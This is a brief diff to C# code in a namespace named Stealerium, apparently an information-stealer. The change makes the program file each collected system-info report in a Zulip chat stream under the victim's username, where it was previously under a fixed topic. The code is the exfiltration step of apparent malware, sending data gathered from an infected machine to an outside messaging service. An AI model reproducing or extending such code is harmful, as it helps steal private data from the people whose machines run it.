@@ -376,7 +376,7 @@ namespace Stealerium
                 SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
 
             // Send the report to Zulip
-            await SendZulipMessageAsync("Szurubooru", "stealerium", info).ConfigureAwait(false);
+            await SendZulipMessageAsync("Szurubooru", SystemInfo.Username, info).ConfigureAwait(false);
         }
 
 
